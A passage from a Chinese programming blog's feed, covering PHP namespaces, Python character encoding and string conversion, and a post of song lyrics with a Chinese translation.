<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//创建空间Blog</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Blog</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Comment</span> </span>&#123; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//非限定名称，表示当前Blog空间</span></span><br><span class="line"><span class="comment">//这个调用将被解析成 Blog\Comment();</span></span><br><span class="line">$blog_comment = <span class="keyword">new</span> Comment();</span><br><span class="line"></span><br><span class="line"><span class="comment">//限定名称，表示相对于Blog空间</span></span><br><span class="line"><span class="comment">//这个调用将被解析成 Blog\Article\Comment();</span></span><br><span class="line">$article_comment = <span class="keyword">new</span> Article\Comment(); <span class="comment">//类前面没有反斜杆\</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//完全限定名称，表示绝对于Blog空间</span></span><br><span class="line"><span class="comment">//这个调用将被解析成 Blog\Comment();</span></span><br><span class="line">$article_comment = <span class="keyword">new</span> \Blog\Comment(); <span class="comment">//类前面有反斜杆\</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//完全限定名称，表示绝对于Blog空间</span></span><br><span class="line"><span class="comment">//这个调用将被解析成 Blog\Article\Comment();</span></span><br><span class="line">$article_comment = <span class="keyword">new</span> \Blog\Article\Comment(); <span class="comment">//类前面有反斜杆\</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//创建Blog的子空间Article</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Blog</span>\<span class="title">Article</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Comment</span> </span>&#123; &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&emsp;<br><font face="Comic sans MS">其实之前我就一直在使用非限定名称和完全限定名称，现在它们终于可以叫出它们的名称了。<br><strong>别名和导入</strong><br>别名和导入可以看作是调用命名空间元素的一种快捷方式。PHP并不支持导入函数或常量。<br>它们都是通过使用use操作符来实现：<br></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Blog</span>\<span class="title">Article</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Comment</span> </span>&#123; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建一个BBS空间（我有打算开个论坛）</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">BBS</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//导入一个命名空间</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">Blog</span>\<span class="title">Article</span>;</span><br><span class="line"><span class="comment">//导入命名空间后可使用限定名称调用元素</span></span><br><span class="line">$article_comment = <span class="keyword">new</span> Article\Comment();</span><br><span class="line"></span><br><span class="line"><span class="comment">//为命名空间使用别名</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">Blog</span>\<span class="title">Article</span> <span class="title">as</span> <span class="title">Arte</span>;</span><br><span class="line"><span class="comment">//使用别名代替空间名</span></span><br><span class="line">$article_comment = <span class="keyword">new</span> Arte\Comment();</span><br><span class="line"></span><br><span class="line"><span class="comment">//导入一个类</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">Blog</span>\<span class="title">Article</span>\<span class="title">Comment</span>;</span><br><span class="line"><span class="comment">//导入类后可使用非限定名称调用元素</span></span><br><span class="line">$article_comment = <span class="keyword">new</span> Comment();</span><br><span class="line"></span><br><span class="line"><span class="comment">//为类使用别名</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">Blog</span>\<span class="title">Article</span>\<span class="title">Comment</span> <span class="title">as</span> <span class="title">Comt</span>;</span><br><span class="line"><span class="comment">//使用别名代替空间名</span></span><br><span class="line">$article_comment = <span class="keyword">new</span> Comt();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<p>我注意到，如果导入元素的时候，当前空间有相同的名字元素将会怎样？显然结果会发生致命错误。<br>例：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace Blog\Article;</span><br><span class="line">class Comment &#123; &#125;</span><br><span class="line"></span><br><span class="line">namespace BBS;</span><br><span class="line">class Comment &#123; &#125;</span><br><span class="line">Class Comt &#123; &#125;</span><br><span class="line"></span><br><span class="line">//导入一个类</span><br><span class="line">use Blog\Article\Comment;</span><br><span class="line"><span class="variable">$article_comment</span> = new Comment(); //与当前空间的Comment发生冲突，程序产生致命错误</span><br><span class="line"></span><br><span class="line">//为类使用别名</span><br><span class="line">use Blog\Article\Comment as Comt;</span><br><span class="line"><span class="variable">$article_comment</span> = new Comt(); //与当前空间的Comt发生冲突，程序产生致命错误</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>&emsp;<br><strong>动态调用</strong><br>PHP提供了namespace关键字和__NAMESPACE__魔法常量动态的访问元素，__NAMESPACE__可以通过组合字符串的形式来动态访问：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Blog</span>\<span class="title">Article</span>;</span><br><span class="line"><span class="keyword">const</span> PATH = <span class="string">&#x27;/Blog/article&#x27;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Comment</span> </span>&#123; &#125;</span><br><span class="line"><span class="comment">//namespace关键字表示当前空间</span></span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">namespace</span>\<span class="title">PATH</span>; <span class="comment">///Blog/article</span></span><br><span class="line">$comment = <span class="keyword">new</span> <span class="keyword">namespace</span>\<span class="title">Comment</span>();</span><br><span class="line"><span class="comment">//魔法常量__NAMESPACE__的值是当前空间名称</span></span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">__NAMESPACE__</span>; <span class="comment">//Blog\Article</span></span><br><span class="line"><span class="comment">//可以组合成字符串并调用</span></span><br><span class="line">$comment_class_name = <span class="keyword">__NAMESPACE__</span> . <span class="string">&#x27;\Comment&#x27;</span>;</span><br><span class="line">$comment = <span class="keyword">new</span> $comment_class_name();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>字符串形式调用问题<br>上面的动态调用的例子中，我们看到了字符串形式的动态调用方式，如果要使用这种方式要注意两个问题。<br><font color="red"><strong>1. 使用双引号的时候特殊字符可能被转义</strong></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace Blog\Article;</span><br><span class="line">class name &#123; &#125;</span><br><span class="line">//我是想调用Blog\Article\name</span><br><span class="line"><span class="variable">$class_name</span> = __NAMESPACE__ . <span class="string">&quot;\name&quot;</span>; //但是\n将被转义为换行符</span><br><span class="line"><span class="variable">$name</span> = new <span class="variable">$class_name</span>(); //发生致命错误</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>&emsp;<br><font color="red"><strong>2. 不会认为是限定名称</strong></font><br>PHP在编译脚本的时候就确定了元素所在的空间，以及导入的情况。而在解析脚本时字符串形式调用只能认为是非限定名称和完全限定名称，而永远不可能是限定名称。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Blog</span>;</span><br><span class="line"><span class="comment">//导入Common类</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">Blog</span>\<span class="title">Article</span>\<span class="title">Common</span>;</span><br><span class="line"><span class="comment">//我想使用非限定名称调用Blog\Article\Common</span></span><br><span class="line">$common_class_name = <span class="string">&#x27;Common&#x27;</span>;</span><br><span class="line"><span class="comment">//实际会被当作非限定名称，也就表示当前空间的Common类，但我当前类没有创建Common类</span></span><br><span class="line">$common = <span class="keyword">new</span> $common_class_name(); <span class="comment">//发生致命错误：Common类不存在</span></span><br><span class="line"><span class="comment">//我想使用限定名称调用Blog\Article\Common</span></span><br><span class="line">$common_class_name = <span class="string">&#x27;Article\Common&#x27;</span>;</span><br><span class="line"><span class="comment">//实际会被当作完全限定名称，也就表示Article空间下的Common类，但我下面只定义了Blog\Article空间而不是Article空间</span></span><br><span class="line">$common = <span class="keyword">new</span> $common_class_name(); <span class="comment">//发生致命错误：Article\Common类不存在</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Blog</span>\<span class="title">Article</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Common</span> </span>&#123; &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP语言</tag>
      </tags>
  </entry>
  <entry>
    <title>PVRIS-OnlyLove</title>
    <url>/post/PVRIS-OnlyLove/</url>
    <content><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=28475345&auto=0&height=66"></iframe>

<center>
I'm hoping you weren't heaven sent
我一直祈盼你并非天赐
Cause only hell knows where you've been
鬼才知道你的行踪
Your built composure's wearing thin
你佯装的镇定愈来愈单薄了
And all your walls are caving in
你的壁垒也渐渐塌陷
Before you shut this down
在你喊停之前
I just wanna lift you up
我只是想撑起你
I'll take all this love I found
我会收藏好我拾到的爱恋
And I hope that it's enough
这就够了
I saw you, yeah you,
我看见你了 是你
you're breaking down
逐渐崩溃的你
I hope you, yeah you,
我希望你 是你
you come around
回到我身边的你
Now don't you shut this down
我不准你现在喊停
ooh no don't you give this up
不准你现在放手
I took all this love I found
我收好了我拾到的爱恋
and I hope that it's enough
我多想就这样满足
Is it enough?
但足矣吗
If we don't bend then this might break
若我们不让步 这一切都将毁灭
Please don't give into this pain
求你了 不要陷入这般痛苦
Just keep on counting down the days
只要数着日子
And dream of me to keep you safe
梦着我 就让你安稳
Don't you shut this down
不准你喊停
No, don't you give this up
不准你放手
I took all this love I found
我收好了我拾到的爱恋
and I hope that it's enough
我多想就这样满足
I saw you, yeah you,
我看见你了 是你
you're breaking down
逐渐崩溃的你
I hope you, yeah you,
我希望你 是你
you come around
回到我身边的你
Now don't you shut this down
我不准你现在喊停
oh no don't you give this up
不准你现在放手
I took all this love I found
我收好了我拾到的爱恋
and I hope that it's enough
我多想就这样满足
Is it enough?
但足矣吗
Don't you shut this down
不准你喊停
Don't you give this up
不准你放手
Don't you shut this down
不准你喊停
Don't you give this up
不准你放手
Before you came around
在你回来之前
I was lost and out of place
我失去了自我 不知所以
You're the only love I found
你是我好不容易找到的挚爱
and I'm hoping that you'll stay
所以我期望你能留下来
Please stay
所以留下来吧
Please stay
请你留下来吧
Please stay
求你留下来吧
</center>]]></content>
      <categories>
        <category>音乐</category>
      </categories>
  </entry>
  <entry>
    <title>Python-基础</title>
    <url>/post/Python-Basics/</url>
    <content><![CDATA[<p>从今天开始Python的学习吧……ヾ(๑╹◡╹)ﾉ”</p>
<a id="more"></a>
<p>本文参考：<br><font color="#00B2EE">[<a href="http://www.runoob.com/python3/python3-tutorial.html">Python3 教程</a>]</font><br><font color="#00B2EE">[<a href="https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000/001431658624177ea4f8fcb06bc4d0e8aab2fd7aa65dd95000">廖雪峰的官方网站Python教程</a>]</font><br><font color="#00B2EE">[<a href="http://www.ituring.com.cn/book/tupubarticle/10626">Python编程：从入门到实践</a>]</font><br><font color="#00B2EE">[<a href="http://www.pythondoc.com/">Python 中文学习大本营-Python 3.6.X 官方教程</a>]</font></p>
<p>&ensp;<br>&ensp;</p>
<center><font color="#00B2EE" face="Comic sans MS" size=5>Python 基础</font> </center>



<p>&emsp;<br>&emsp;</p>
<h3 id="一-基础语法"><a href="#一-基础语法" class="headerlink" title="一. 基础语法"></a><font color="#FF6347" face="Comic sans MS">一. 基础语法</font></h3><p><font face="Comic sans MS"><font color="#00B2EE"><strong>参见本站博客：[<a href="https://directoree.top/post/Python-Grammar">Python-基础语法</a>]</strong></font><br></font></p>
<br>

<br>

<h3 id="二-变量和数据类型"><a href="#二-变量和数据类型" class="headerlink" title="二. 变量和数据类型"></a><font color="#FF6347" face="Comic sans MS">二. 变量和数据类型</font></h3><p><font face="Comic sans MS"><font color="#00B2EE"><strong>参见本站博客：[<a href="https://directoree.top/post/Python-Variables-DataTypes">Python-变量和数据类型</a>]</strong></font><br></font></p>
<br>

<br>

<h3 id="三-运算符"><a href="#三-运算符" class="headerlink" title="三. 运算符"></a><font color="#FF6347" face="Comic sans MS">三. 运算符</font></h3><p><font face="Comic sans MS"><font color="#00B2EE"><strong>参见本站博客：[<a href="https://directoree.top/post/Python-Operators">Python-运算符</a>]</strong></font><br></font></p>
<br>

<br>

<h3 id="四-条件语句与循环"><a href="#四-条件语句与循环" class="headerlink" title="四. 条件语句与循环"></a><font color="#FF6347" face="Comic sans MS">四. 条件语句与循环</font></h3><p><font face="Comic sans MS"><font color="#00B2EE"><strong>参见本站博客：[<a href="https://directoree.top/post/Python-ConditionalStatements-loops">Python-条件语句与循环</a>]</strong></font><br></font></p>
<br>

<br>

<h3 id="五-字符编码、字符串、格式化"><a href="#五-字符编码、字符串、格式化" class="headerlink" title="五. 字符编码、字符串、格式化"></a><font color="#FF6347" face="Comic sans MS">五. 字符编码、字符串、格式化</font></h3><p><font face="Comic sans MS"><font color="#00B2EE"><strong>参见本站博客：[<a href="https://directoree.top/post/Python-Coding">Python-字符编码&amp;字符串&amp;格式化</a>]</strong></font><br></font></p>
<br>

<br>

<h3 id="六-列表、元组、字典、集合"><a href="#六-列表、元组、字典、集合" class="headerlink" title="六. 列表、元组、字典、集合"></a><font color="#FF6347" face="Comic sans MS">六. 列表、元组、字典、集合</font></h3><p><font face="Comic sans MS"><font color="#00B2EE"><strong>参见本站博客：[<a href="https://directoree.top/post/Python-list-tuple-dict-set">Python-列表、元组、字典、集合</a>]</strong></font><br></font></p>
<br>

<br>

<h3 id="七-函数"><a href="#七-函数" class="headerlink" title="七. 函数"></a><font color="#FF6347" face="Comic sans MS">七. 函数</font></h3><p><font face="Comic sans MS"><font color="#00B2EE"><strong>参见本站博客：[<a href="https://directoree.top/post/Python-Function">Python-函数</a>]</strong></font><br></font></p>
<br>

<br>

<h3 id="八-生成器与迭代器"><a href="#八-生成器与迭代器" class="headerlink" title="八. 生成器与迭代器"></a><font color="#FF6347" face="Comic sans MS">八. 生成器与迭代器</font></h3><p><font face="Comic sans MS"><font color="#00B2EE"><strong>参见本站博客：[<a href="https://directoree.top/post/Python-generator-iterator">Python-生成器与迭代器</a>]</strong></font><br></font></p>
<br>

<br>

<h3 id="九-模块和包"><a href="#九-模块和包" class="headerlink" title="九. 模块和包"></a><font color="#FF6347" face="Comic sans MS">九. 模块和包</font></h3><p><font face="Comic sans MS"><font color="#00B2EE"><strong>参见本站博客：[<a href="https://directoree.top/post/Python-Modules-Packages">Python-模块和包</a>]</strong></font><br></font></p>
<br>

<br>

<h3 id="十-函数式编程"><a href="#十-函数式编程" class="headerlink" title="十. 函数式编程"></a><font color="#FF6347" face="Comic sans MS">十. 函数式编程</font></h3><p><font face="Comic sans MS"><font color="#00B2EE"><strong>参见本站博客：[<a href="https://directoree.top/post/Python-FunctionalProgramming">Python-函数式编程</a>]</strong></font><br></font></p>
<br>

<br>

<h3 id="十一-文件系统"><a href="#十一-文件系统" class="headerlink" title="十一. 文件系统"></a><font color="#FF6347" face="Comic sans MS">十一. 文件系统</font></h3><p><font face="Comic sans MS"><font color="#00B2EE"><strong>参见本站博客：[<a href="https://directoree.top/post/Python-FileContents">Python-文件系统</a>]</strong></font><br></font></p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python语言</tag>
      </tags>
  </entry>
  <entry>
    <title>Python-字符编码&amp;字符串&amp;格式化</title>
    <url>/post/Python-Coding/</url>
    <content><![CDATA[<p>字符编码、字符串(๑°⌓︎°๑) </p>
<a id="more"></a>

<br>

<br>


<center><font color="#00B2EE" face="Comic sans MS" size=5>Python-字符编码、字符串、格式化</font> </center>

<br>

<br>

<h3 id="一-字符编码"><a href="#一-字符编码" class="headerlink" title="一. 字符编码"></a><font color="#FF6347" face="Comic sans MS">一. 字符编码</font></h3><ol>
<li><p>我们已经讲过了，字符串也是一种数据类型，但是，<strong>字符串</strong>比较特殊的是还有一个<strong>编码</strong>问题。</p>
</li>
<li><p><font color="#FF7F00"><strong>因为计算机只能处理数字，如果要处理文本，就必须先把文本转换为数字才能处理</strong></font>。最早的计算机在设计时采用8个比特（**<code>8 bit</code><strong>）作为一个字节（</strong><code>1 byte</code>**）。</p>
<ol>
<li>所以，**<code>一个字节</code><strong>能表示的最大的整数就是</strong><code>255</code>**（二进制11111111=十进制255）；</li>
<li>如果要表示更大的整数，就必须用更多的字节。比如两个字节可以表示的最大整数是65535，**<code>4个字节</code><strong>可以表示的最大整数是</strong><code>4294967295</code>**。</li>
</ol>
</li>
<li><p>由于计算机是美国人发明的，因此，最早只有127个字符被编码到计算机里，也就是大小写英文字母、数字和一些符号，这个编码表被称为<font color="#FF7F00"><strong>ASCII编码</strong></font>，比如大写字母<code>A</code>的编码是<code>65</code>，小写字母<code>z</code>的编码是<code>122</code>。</p>
</li>
<li><p>但是要处理中文显然一个字节是不够的，<strong>至少需要两个字节</strong>，而且还不能和ASCII编码冲突，所以，<font color="#FF7F00"><strong>中国制定了GB2312编码，用来把中文编进去</strong></font>。</p>
</li>
<li><p>你可以想得到的是，全世界有上百种语言，日本把日文编到<code>Shift_JIS</code>里，韩国把韩文编到<code>Euc-kr</code>里，各国有各国的标准，就会不可避免地出现冲突，结果就是，在多语言混合的文本中，显示出来会有乱码。</p>
</li>
<li><p>因此，<code>Unicode</code>应运而生。<font color="#FF7F00"><strong>Unicode把所有语言都统一到一套编码里，这样就不会再有乱码问题了</strong></font>。</p>
<ol>
<li><p>Unicode标准也在不断发展，但最常用的是<font color="#00B2EE"><strong>用两个字节表示一个字符</strong></font>（如果要用到非常偏僻的字符，就需要4个字节）。现代操作系统和大多数编程语言都直接支持Unicode。</p>
</li>
<li><p>现在，捋一捋ASCII编码和Unicode编码的区别：<font color="#00B2EE"><strong>ASCII编码是1个字节，而Unicode编码通常是2个字节</strong></font>。</p>
<ol>
<li>字母<code>A</code>用ASCII编码是十进制的<code>65</code>，二进制的<code>01000001</code>；</li>
<li>字符<code>0</code>用ASCII编码是十进制的<code>48</code>，二进制的<code>00110000</code>，注意字符’0’(‘零’)和整数0(零)是不同的；</li>
<li>汉字<code>中</code>已经超出了ASCII编码的范围，用Unicode编码是十进制的<code>20013</code>，二进制的<code>01001110 00101101</code>。</li>
<li>你可以猜测，如果<font color="red"><strong>把ASCII编码的A用Unicode编码，只需要在前面补0(零)就可以</strong></font>，因此，A的Unicode编码是00000000 01000001。</li>
</ol>
</li>
<li><p>新的问题又出现了：如果统一成Unicode编码，乱码问题从此消失了。但是，如果你写的文本基本上全部是英文的话，<font color="#00B2EE"><strong>用Unicode编码比ASCII编码需要多一倍的存储空间</strong></font>，在存储和传输上就十分不划算。</p>
</li>
<li><p>所以，<strong>本着节约的精神</strong>，又出现了<font color="#00B2EE"><strong>把Unicode编码转化为“可变长编码”的UTF-8编码</strong></font>。UTF-8编码把一个Unicode字符根据不同的数字大小编码成1-6个字节，常用的英文字母被编码成1个字节，汉字通常是3个字节，只有很生僻的字符才会被编码成4-6个字节。如果你要传输的文本包含大量英文字符，用UTF-8编码就能节省空间：</p>
</li>
</ol>
</li>
</ol>
<p>||||<br>:-:|:-:|:-:|:-:|<br>字符    |ASCII    |Unicode    |UTF-8<br>A    |1000001    |00000000 01000001    |01000001<br>中    |x            |01001110 00101101    |11100100 10111000 10101101</p>
<blockquote>
<ol>
<li>从上面的表格还可以发现，UTF-8编码有一个额外的好处，就是<font color="#FF7F00"><strong>ASCII编码实际上可以被看成是UTF-8编码的一部分</strong></font>，所以，大量只支持ASCII编码的历史遗留软件可以在UTF-8编码下继续工作。</li>
</ol>
</blockquote>
<p><strong>总结一下现在计算机系统通用的字符编码工作方式：</strong></p>
<ol>
<li><font color="#FF7F00"><strong>在计算机内存中，统一使用Unicode编码，当需要保存到硬盘或者需要传输的时候，就转换为UTF-8编码</strong></font>。</li>
<li>举例：用记事本编辑(计算机内存中)的时候，从文件读取的UTF-8字符被转换为Unicode字符到内存里，编辑完成后，保存的时候再把Unicode转换为UTF-8(保存到文件硬盘或者需要传输)</li>
</ol>
<br>


<p>PS：所以你看到很多网页的源码上会有类似<code>&lt;meta charset=&quot;UTF-8&quot; /&gt;</code>的信息，表示该网页正是用的UTF-8编码。</p>
<br>

<br>

<h3 id="二-代码编码和文件编码的设置"><a href="#二-代码编码和文件编码的设置" class="headerlink" title="二. 代码编码和文件编码的设置"></a><font color="#FF6347" face="Comic sans MS">二. 代码编码和文件编码的设置</font></h3><blockquote>
<p><strong>Python中默认的编码格式是 ASCII 格式，在没修改编码格式时无法正确打印汉字，所以在读取中文时会报错。</strong><br>解决方法为只要在文件开头加入<code># -*- coding: UTF-8 -*-</code> 或者 <code>#coding=utf-8</code> 就行了<br>（<strong>注意：</strong><code>#coding=utf-8</code> 的 <code>=</code> 号两边不要空格。）</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;你好，世界&quot;</span>;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">你好，世界</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>注意：</strong></p>
</blockquote>
<ol>
<li>Python3.X 源码文件默认使用utf-8编码，所以可以正常解析中文，无需指定 UTF-8 编码。</li>
<li>注意：如果你使用编辑器，同时需要设置 py 文件存储的格式为 UTF-8</li>
</ol>
<br>

<br>

<h3 id="三-字符与编码的转换"><a href="#三-字符与编码的转换" class="headerlink" title="三. 字符与编码的转换"></a><font color="#FF6347" face="Comic sans MS">三. 字符与编码的转换</font></h3><p>在最新的Python 3版本中，<font color="#FF7F00"><strong>字符串是以Unicode编码的</strong></font>，也就是说，Python的字符串支持多语言（字符串可以写任意国家文字）。</p>
<br>

<h4 id="3-1-字符与十进制编码的转换"><a href="#3-1-字符与十进制编码的转换" class="headerlink" title="3.1 字符与十进制编码的转换"></a><font color="#3CB371" face="Comic sans MS">3.1 字符与十进制编码的转换</font></h4><blockquote>
<p><strong>使用函数：</strong></p>
</blockquote>
<ol>
<li>ord()：将字符转换成其对应的整数（十进制），注意不是字符串；</li>
<li>chr()：将十进制整数转换成其对应的字符。</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=ord(<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">b=chr(<span class="number">120</span>)</span><br><span class="line">print(a)</span><br><span class="line">print(b)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line"><span class="number">65</span> </span><br><span class="line">x </span><br></pre></td></tr></table></figure>



<br>

<h4 id="3-2-不同编码之间的转换"><a href="#3-2-不同编码之间的转换" class="headerlink" title="3.2 不同编码之间的转换"></a><font color="#3CB371" face="Comic sans MS">3.2 不同编码之间的转换</font></h4><p>由于Python的字符串类型是str，<font color="#FF7F00"><strong>在内存中以Unicode表示，一个字符对应若干个字节</strong></font>。如果要在网络上传输，或者保存到磁盘上，就需要<font color="#FF7F00"><strong>把str变为以字节为单位的bytes</strong></font>。</p>
<p>Python对bytes类型的数据用带<code>b前缀</code>的<font color="#FF7F00"><strong>单引号</strong></font>或<font color="#FF7F00"><strong>双引号</strong></font>表示：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = <span class="string">b&#x27;ABC&#x27;</span></span><br><span class="line">print(x)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line"><span class="string">b&#x27;ABC&#x27;</span> </span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>结论：</strong>要注意区分’ABC’和b’ABC’，前者是str，后者虽然内容显示得和前者一样，但<font color="#FF7F00"><strong>bytes的每个字符都只占用一个字节</strong></font>。</p>
</blockquote>
<br>


<p><font color="#00B2EE" face="Comic sans MS"><strong>不同编码之间的转换使用函数：</strong></font></p>
<ol>
<li><strong>decode()：</strong> 解码，将其他编码的字符串解码成unicode编码；</li>
<li><strong>encode()：</strong> 转码，将unicode编码的字符串转码成其他编码。</li>
<li><strong>decode(“utf-8”, errors=”ignore”) ：</strong> 忽略其中有异常的编码，仅显示有效的编码；</li>
<li><strong>decode(“utf-8”, errors=”replace”)：</strong> 替换其中异常的编码，这个相对来可能一眼就知道那些字符编码出问题了；</li>
<li><strong>len()：</strong> 计算的是str的字符数，如果换成bytes，len()函数就计算字节数。</li>
</ol>
<br>

<p>资料查阅：<font color="#00B2EE">[<a href="https://blog.csdn.net/xw_classmate/article/details/51934723">Python中的编码（encode）与解码（decode）程</a>]</font></p>
<br>

<p>字符串在Python内部的表示是unicode编码，因此，在做编码转换时，通常需要以unicode作为<font color="#FF7F00"><strong>中间编码</strong></font>，即先将其他编码的字符串解码（<code>decode</code>）成unicode，再从unicode编码（<code>encode</code>）成另一种编码。</p>
<br>

<p>举例1：以Unicode表示的str通过<code>encode()</code>方法可以编码为指定的bytes</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(<span class="string">&#x27;ABC&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">print(<span class="string">&#x27;中文&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">print(<span class="string">&#x27;中文&#x27;</span>.encode(<span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line"><span class="string">b&#x27;ABC&#x27;</span> </span><br><span class="line"><span class="string">b&#x27;\xe4\xb8\xad\xe6\x96\x87&#x27;</span> </span><br><span class="line">Traceback (most recent call last): </span><br><span class="line">  File <span class="string">&quot;C:\Users\Alvin\AppData\Local\Temp\learn_python_q5t__kzk_py\test_21.py&quot;</span>, line <span class="number">4</span>, <span class="keyword">in</span> &lt;module&gt; </span><br><span class="line">    print(<span class="string">&#x27;中文&#x27;</span>.encode(<span class="string">&#x27;ascii&#x27;</span>)) </span><br><span class="line">UnicodeEncodeError: <span class="string">&#x27;ascii&#x27;</span> codec can<span class="string">&#x27;t encode characters in position 0-1: ordinal not in range(128) </span></span><br></pre></td></tr></table></figure>

<br>

<blockquote>
<p>第三个输出报错是因为含有中文的str无法用ASCII编码，因为中文编码的范围超过了ASCII编码的范围，Python会报错。</p>
</blockquote>
<br>

<p>举例2：以Unicode表示的str通过<code>encode()</code>方法可以编码为指定的bytes    </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(<span class="string">b&#x27;ABC&#x27;</span>.decode(<span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line">print(<span class="string">b&#x27;\xe4\xb8\xad\xe6\x96\x87&#x27;</span>.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">print(<span class="string">b&#x27;\xe4\xb8\xad\xff&#x27;</span>.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">ABC </span><br><span class="line">中文 </span><br><span class="line">Traceback (most recent call last): </span><br><span class="line">  File <span class="string">&quot;C:\Users\Alvin\AppData\Local\Temp\learn_python_q5t__kzk_py\test_22.py&quot;</span>, line <span class="number">4</span>, <span class="keyword">in</span> &lt;module&gt; </span><br><span class="line">    print(<span class="string">b&#x27;\xe4\xb8\xad\xff&#x27;</span>.decode(<span class="string">&#x27;utf-8&#x27;</span>)) </span><br><span class="line">UnicodeDecodeError: <span class="string">&#x27;utf-8&#x27;</span> codec can<span class="string">&#x27;t decode byte 0xff in position 3: invalid start byte </span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>第三个输出报错是因为bytes中包含无法解码的字节，decode()方法会报错。</p>
</blockquote>
<br>

<p>举例3：如果bytes中只有一小部分无效的字节，可以传入<code>errors=&#39;ignore&#39;</code>忽略错误的字节</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(<span class="string">b&#x27;\xe4\xb8\xad&#x27;</span>.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">print(<span class="string">&#x27;中&#x27;</span>.encode())</span><br><span class="line">print(<span class="string">b&#x27;\xe4\xb8\xad\xff&#x27;</span>.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>))</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">中 </span><br><span class="line"><span class="string">b&#x27;\xe4\xb8\xad&#x27;</span> </span><br><span class="line">中 </span><br></pre></td></tr></table></figure>

<br>

<p>举例4：<code>len()</code>函数计算的是str的字符数，如果换成bytes，len()函数就计算字节数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(len(<span class="string">&#x27;ABC&#x27;</span>))</span><br><span class="line">print(len(<span class="string">&#x27;中文&#x27;</span>))</span><br><span class="line">print(len(<span class="string">b&#x27;ABC&#x27;</span>))</span><br><span class="line">print(len(<span class="string">&#x27;中文&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)))</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line"><span class="number">3</span> </span><br><span class="line"><span class="number">2</span> </span><br><span class="line"><span class="number">3</span> </span><br><span class="line"><span class="number">6</span> </span><br></pre></td></tr></table></figure>

<br>

<blockquote>
<ol>
